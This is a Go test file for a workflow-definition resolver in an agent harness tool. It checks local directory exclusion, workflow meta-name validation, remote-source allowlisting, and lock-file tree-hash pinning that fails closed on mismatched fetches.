// TestResolveWorkflowDefinition_LocalLeavesOutFullsendDir checks that
// fullsend's configuration directory is left out of a local definition
// whenever it lies under the source, not only for the checkout root.
func TestResolveWorkflowDefinition_LocalLeavesOutFullsendDir(t *testing.T) {
	repo := t.TempDir()
	def := filepath.Join(repo, "ci")
	fullsendDir := filepath.Join(def, ".fullsend")
	for p, c := range map[string]string{
		".claude-plugin/plugin.json":  `{"name":"wfplug"}`,
		"workflows/probe.js":          "export const meta = { name: 'probe' };\n",
		".fullsend/config.yaml":       "version: \"1\"\n",
		".fullsend/harness/code.yaml": "agent: agents/code.md\n",
	} {
		full := filepath.Join(def, filepath.FromSlash(p))
		require.NoError(t, os.MkdirAll(filepath.Dir(full), 0o755))
		require.NoError(t, os.WriteFile(full, []byte(c), 0o644))
	}
	gitIn(t, repo, "init", "-q", "-b", "main")
	gitIn(t, repo, "add", "-A")

	rw, _, err := resolveWF(wfHarness(), "ci", localLoc(fullsendDir), ResolveOpts{WorkspaceRoot: fullsendDir})
	require.NoError(t, err)
	_, err = os.Stat(filepath.Join(rw.LocalPath, ".fullsend"))
	assert.True(t, os.IsNotExist(err), "ci/.fullsend/ is left out of source ci")
	_, err = os.Stat(filepath.Join(rw.LocalPath, "workflows", "probe.js"))
	assert.NoError(t, err)
}

func TestResolveWorkflowDefinition_Meta(t *testing.T) {
	tests := []struct {
		name    string
		script  string
		wantErr string
	}{
		{name: "match", script: "export const meta = { name: 'probe', description: 'x' };\n"},
		{
			name:    "mismatch",
			script:  "export const meta = { name: \"run-all\" };\n",
			wantErr: `workflows/probe.js declares meta.name "run-all"; Claude Code runs it as /wfplug:run-all, so rename the file or set meta.name to "probe"`,
		},
		{
			name:    "missing meta",
			script:  "export default async () => {}\n",
			wantErr: `workflows/probe.js: the script does not start with ` + "`export const meta = {`" + `; Claude Code lists a workflow only when ` + "`export const meta = { ... }`" + ` is the script's first statement and a plain object literal`,
		},
		{
			name:    "meta not first",
			script:  "import x from './x.js'\nexport const meta = { name: 'probe' };\n",
			wantErr: "the script does not start with `export const meta = {`",
		},
		{
			name:    "non-literal name",
			script:  "const n = 'probe'\nexport const meta = { name: n };\n",
			wantErr: "the script does not start with `export const meta = {`",
		},
		{
			name:    "name is an expression",
			script:  "export const meta = { name: n };\n",
			wantErr: "meta.name is not a single- or double-quoted string",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			files := wfTree()
			files["workflows/probe.js"] = []byte(tt.script)
			_, _, err := resolveWF(wfHarness(), wfURL(files), WorkflowLocation{}, wfOpts(t, staticFetcher(files, nil)))
			if tt.wantErr == "" {
				require.NoError(t, err)
				return
			}
			require.Error(t, err)
			assert.Contains(t, err.Error(), tt.wantErr)
		})
	}
}

func piTree() map[string][]byte {
	return map[string][]byte{
		"index.js":       []byte("export default function (pi) {}\n"),
		"lib/steps.js":   []byte("export const steps = [];\n"),
		"scripts/run.sh": []byte("#!/bin/sh\n"),
	}
}

func TestResolveWorkflowDefinition_PiExtension(t *testing.T) {
	files := piTree()
	h := &harness.Harness{Agent: "a.md", Role: "test", Workflow: &harness.WorkflowSpec{}}
	rw, dep, err := resolveWF(h, wfURL(files), WorkflowLocation{}, wfOpts(t, staticFetcher(files, nil)))
	require.NoError(t, err)
	require.NotNil(t, dep)
	assert.Equal(t, pluginformat.KindPi, rw.Kind)
	assert.Empty(t, rw.PluginName, "a pi extension has no Claude namespace")
	require.Len(t, h.Plugins, 1, "the extension is delivered like a plugins: entry")
	assert.Equal(t, harness.WorkflowSandboxDir, h.Plugins[0].Name())
	kind, _, err := pluginformat.Detect(h.Plugins[0].Path)
	require.NoError(t, err)
	assert.Equal(t, pluginformat.KindPi, kind, "the pi runtime picks it up by kind, with -e")

	for name, spec := range map[string]*harness.WorkflowSpec{
		"name": {Name: "probe"},
		"args": {Name: "probe", Args: "x"},
	} {
		t.Run("refuses "+name, func(t *testing.T) {
			h := &harness.Harness{Agent: "a.md", Role: "test", Workflow: spec}
			_, _, err := resolveWF(h, wfURL(files), WorkflowLocation{}, wfOpts(t, staticFetcher(files, nil)))
			require.Error(t, err)
			assert.Contains(t, err.Error(), "is a pi extension, which starts its own sequence from its session hook, so workflow.name and workflow.args do not apply; remove them")
		})
	}
	t.Run("a Claude plugin of the same name is no collision", func(t *testing.T) {
		dir := filepath.Join(t.TempDir(), "helpers")
		require.NoError(t, os.MkdirAll(filepath.Join(dir, ".claude-plugin"), 0o755))
		require.NoError(t, os.WriteFile(filepath.Join(dir, ".claude-plugin", "plugin.json"), []byte(`{"name":"workflow-definition"}`), 0o644))
		h := &harness.Harness{Agent: "a.md", Role: "test", Workflow: &harness.WorkflowSpec{}, Plugins: []harness.PluginSpec{{Path: dir}}}
		_, _, err := resolveWF(h, wfURL(files), WorkflowLocation{}, wfOpts(t, staticFetcher(files, nil)))
		require.NoError(t, err)
	})
}

func TestResolveWorkflowDefinition_ClaudeNeedsName(t *testing.T) {
	files := wfTree()
	h := &harness.Harness{Agent: "a.md", Role: "test", Workflow: &harness.WorkflowSpec{}}
	_, _, err := resolveWF(h, wfURL(files), WorkflowLocation{}, wfOpts(t, staticFetcher(files, nil)))
	require.Error(t, err)
	assert.Contains(t, err.Error(), "is a Claude Code plugin, so workflow.name is required: set it to the <name> of the workflows/<name>.js script to start")
}

func TestResolveWorkflowDefinition_AddedByURL(t *testing.T) {
	t.Run("relative source is refused", func(t *testing.T) {
		_, _, err := resolveWF(wfHarness(), "pipelines/sample", WorkflowLocation{HarnessDir: t.TempDir(), AddedByURL: true}, ResolveOpts{WorkspaceRoot: t.TempDir()})
		require.Error(t, err)
		assert.Equal(t, `workflow.source "pipelines/sample" is relative, but this harness was added by URL, so relative paths resolve in your repository, not the harness's; pin source as a tree URL with #sha256=, or install the harness through a one-line base: harness`, err.Error())
	})
	t.Run("pinned tree URL is accepted", func(t *testing.T) {
		files := wfTree()
		_, _, err := resolveWF(wfHarness(), wfURL(files), WorkflowLocation{AddedByURL: true}, wfOpts(t, staticFetcher(files, nil)))
		require.NoError(t, err)
	})
}

func TestResolveWorkflowDefinition_NotAllowlisted(t *testing.T) {
	files := wfTree()
	opts := wfOpts(t, staticFetcher(files, nil))
	opts.OrgAllowlist = []string{"https://github.com/other-org/"}
	_, _, err := resolveWF(wfHarness(), wfURL(files), WorkflowLocation{}, opts)
	require.Error(t, err)
	assert.Contains(t, err.Error(), `workflow.source URL "https://github.com/example-org/sample-pipeline/tree/`+wfSHA+`" is not covered by allowed_remote_resources; add a prefix that covers it, such as https://github.com/example-org/sample-pipeline/, to allowed_remote_resources in config.yaml`)
}

// A relative source in a URL base is pinned to the base's repository and
// commit during composition (harness.ResolveBaseWorkflowSource); it has no
// #sha256= fragment, so resolution fetches it at that commit, records its
// tree hash and serves it from the URL index afterwards, as a base plugin
// is.
func TestResolveWorkflowDefinition_BasePinnedSource(t *testing.T) {
	files := wfTree()
	baseURL := "https://raw.githubusercontent.com/example-org/sample-pipeline/" + wfSHA + "/.fullsend/harness/base.yaml"
	rawAllow := []string{"https://raw.githubusercontent.com/example-org/"}
	inherited := func(t *testing.T) *harness.Harness {
		t.Helper()
		spec := &harness.WorkflowSpec{Source: "pipelines/sample", Name: "probe"}
		require.NoError(t, harness.ResolveBaseWorkflowSource(spec, baseURL, rawAllow))
		return &harness.Harness{Agent: "a.md", Role: "test", Workflow: spec}
	}
	calls := 0
	fetcher := func(_ context.Context, cloneURL, path, ref, _ string) (map[string][]byte, error) {
		calls++
		if cloneURL != "https://github.com/example-org/sample-pipeline.git" || path != "pipelines/sample" || ref != wfSHA {
			return nil, errors.New("unexpected fetch " + cloneURL + " " + path + " " + ref)
		}
		return files, nil
	}
	ws := t.TempDir()
	opts := ResolveOpts{WorkspaceRoot: ws, OrgAllowlist: rawAllow, TreeFetcher: fetcher}

	h := inherited(t)
	rw, dep, err := ResolveWorkflowDefinition(context.Background(), h, WorkflowLocation{}, opts)
	require.NoError(t, err)
	assert.Equal(t, "https://raw.githubusercontent.com/example-org/sample-pipeline/"+wfSHA+"/pipelines/sample/", dep.URL, "recorded under its allowlist key, as a base plugin is")
	assert.Equal(t, "https://github.com/example-org/sample-pipeline/tree/"+wfSHA+"/pipelines/sample", rw.Source)
	assert.Equal(t, fetch.ComputeTreeHash(files), dep.SHA256, "the fetched tree hash is what lock records")
	assert.Equal(t, WorkflowDependencyField, dep.Field)
	assert.False(t, dep.CacheHit)
	assert.Equal(t, "example-org/sample-pipeline@0123456789ab/pipelines/sample", rw.DisplaySource())
	assert.Equal(t, 1, calls)

	offline := opts
	offline.FetchPolicy.Offline = true
	_, dep2, err := ResolveWorkflowDefinition(context.Background(), inherited(t), WorkflowLocation{}, offline)
	require.NoError(t, err)
	assert.True(t, dep2.CacheHit, "the URL index serves the base-pinned source")
	assert.Equal(t, dep.SHA256, dep2.SHA256)
	assert.Equal(t, 1, calls)

	t.Run("allowlist is checked on the raw-content directory", func(t *testing.T) {
		o := opts
		o.WorkspaceRoot = t.TempDir()
		o.OrgAllowlist = []string{"https://github.com/example-org/"}
		_, _, err := ResolveWorkflowDefinition(context.Background(), inherited(t), WorkflowLocation{}, o)
		require.Error(t, err)
		assert.Contains(t, err.Error(), `"https://raw.githubusercontent.com/example-org/sample-pipeline/`+wfSHA+`/pipelines/sample/" is not covered by allowed_remote_resources; add a prefix that covers it, such as https://raw.githubusercontent.com/example-org/sample-pipeline/`)
	})
	t.Run("offline with a cold cache fails", func(t *testing.T) {
		o := offline
		o.WorkspaceRoot = t.TempDir()
		_, _, err := ResolveWorkflowDefinition(context.Background(), inherited(t), WorkflowLocation{}, o)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "offline mode forbids fetching it")
	})
}

// A replayed lock entry's hash is authoritative for a base-pinned
// source: the URL index only serves runs without a lock, so a missing
// index entry does not break an offline replay and an index entry
// repointed at another cached tree never delivers that tree.
func TestResolveWorkflowDefinition_LockedHashWinsOverURLIndex(t *testing.T) {
	files := wfTree()
	other := wfTree()
	other["workflows/probe.js"] = []byte("export const meta = {name: \"probe\", description: \"other\"};\n")
	lockedHash, otherHash := fetch.ComputeTreeHash(files), fetch.ComputeTreeHash(other)
	baseURL := "https://raw.githubusercontent.com/example-org/sample-pipeline/" + wfSHA + "/.fullsend/harness/base.yaml"
	rawAllow := []string{"https://raw.githubusercontent.com/example-org/"}
	cleanURL := "https://github.com/example-org/sample-pipeline/tree/" + wfSHA + "/pipelines/sample"
	inherited := func(t *testing.T) *harness.Harness {
		t.Helper()
		spec := &harness.WorkflowSpec{Source: "pipelines/sample", Name: "probe"}
		require.NoError(t, harness.ResolveBaseWorkflowSource(spec, baseURL, rawAllow))
		return &harness.Harness{Agent: "a.md", Role: "test", Workflow: spec}
	}
	fetchOf := func(tree map[string][]byte, calls *int) gitfetch.TreeFetchFunc {
		return func(context.Context, string, string, string, string) (map[string][]byte, error) {
			*calls++
			return tree, nil
		}
	}
	// replayOpts is a workspace with both trees cached and the given URL
	// index entry ("" for none), replaying a lock that records lockedHash.
	replayOpts := func(t *testing.T, indexHash string, fetcher gitfetch.TreeFetchFunc) ResolveOpts {
		t.Helper()
		ws := t.TempDir()
		for _, tree := range []map[string][]byte{files, other} {
			_, err := fetch.CachePutMaterializedDir(context.Background(), ws, cleanURL, tree)
			require.NoError(t, err)
		}
		if indexHash != "" {
			require.NoError(t, harness.RecordURLIndex(ws, WorkflowDependencyField+":"+cleanURL, indexHash))
		}
		return ResolveOpts{
			WorkspaceRoot: ws, OrgAllowlist: rawAllow, TreeFetcher: fetcher,
			FetchPolicy: fetch.FetchPolicy{Offline: true}, LockedWorkflowSHA256: lockedHash,
		}
	}

	t.Run("missing index entry, offline replay succeeds", func(t *testing.T) {
		calls := 0
		h := inherited(t)
		rw, dep, err := ResolveWorkflowDefinition(context.Background(), h, WorkflowLocation{}, replayOpts(t, "", fetchOf(files, &calls)))
		require.NoError(t, err)
		assert.Equal(t, lockedHash, rw.TreeHash)
		assert.Equal(t, lockedHash, dep.SHA256)
		assert.True(t, dep.CacheHit)
		assert.Equal(t, 0, calls)
	})
	t.Run("index repointed at another cached tree delivers the locked tree", func(t *testing.T) {
		calls := 0
		h := inherited(t)
		rw, _, err := ResolveWorkflowDefinition(context.Background(), h, WorkflowLocation{}, replayOpts(t, otherHash, fetchOf(other, &calls)))
		require.NoError(t, err)
		assert.Equal(t, lockedHash, rw.TreeHash, "never the tree the index points at")
		got, err := os.ReadFile(filepath.Join(rw.LocalPath, "workflows", "probe.js"))
		require.NoError(t, err)
		assert.Equal(t, string(files["workflows/probe.js"]), string(got))
		assert.Equal(t, 0, calls)
	})
	t.Run("a fetch that returns another tree fails closed", func(t *testing.T) {
		calls := 0
		o := replayOpts(t, otherHash, fetchOf(other, &calls))
		o.WorkspaceRoot = t.TempDir()
		o.FetchPolicy.Offline = false
		_, _, err := ResolveWorkflowDefinition(context.Background(), inherited(t), WorkflowLocation{}, o)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "workflow.source: tree hash mismatch for "+cleanURL+": .fullsend/lock.yaml records sha256="+lockedHash+" but the fetched tree hashes to sha256="+otherHash+"; run `fullsend lock` to re-lock the definition")
		assert.Equal(t, 1, calls)
	})
	t.Run("a cold cache fetches the locked tree", func(t *testing.T) {
		calls := 0
		o := replayOpts(t, "", fetchOf(files, &calls))
		o.WorkspaceRoot = t.TempDir()
		o.FetchPolicy.Offline = false
		rw, dep, err := ResolveWorkflowDefinition(context.Background(), inherited(t), WorkflowLocation{}, o)
		require.NoError(t, err)
		assert.Equal(t, lockedHash, rw.TreeHash)
		assert.False(t, dep.CacheHit)
		assert.Equal(t, 1, calls)
		indexed, ok := harness.LookupURLIndex(o.WorkspaceRoot, WorkflowDependencyField+":"+cleanURL)
		assert.True(t, ok)
		assert.Equal(t, lockedHash, indexed, "the index is written with the locked hash")
	})
	t.Run("a harness pin that disagrees with the lock is refused", func(t *testing.T) {
		calls := 0
		h := wfHarness()
		_, _, err := resolveWF(h, wfURL(other), WorkflowLocation{}, ResolveOpts{
			WorkspaceRoot: t.TempDir(), OrgAllowlist: []string{"https://github.com/example-org/"},
			TreeFetcher: fetchOf(other, &calls), LockedWorkflowSHA256: lockedHash,
		})
		require.Error(t, err)
		assert.Contains(t, err.Error(), "workflow.source: the harness pins sha256="+otherHash+" for https://github.com/example-org/sample-pipeline/tree/"+wfSHA+", but .fullsend/lock.yaml records sha256="+lockedHash+"; run `fullsend lock` to update the lock file")
		assert.Equal(t, 0, calls)
	})
}

func TestResolvedWorkflow_DisplaySource(t *testing.T) {
	assert.Equal(t, "pipelines/sample", (&ResolvedWorkflow{Local: true, Source: "pipelines/sample"}).DisplaySource())
	assert.Equal(t, "example-org/sample-pipeline@0123456789ab", (&ResolvedWorkflow{Owner: "example-org", Repo: "sample-pipeline", Commit: wfSHA}).DisplaySource())
	assert.Equal(t, "o/r@abc", (&ResolvedWorkflow{Owner: "o", Repo: "r", Commit: "abc", Path: ""}).DisplaySource())
}
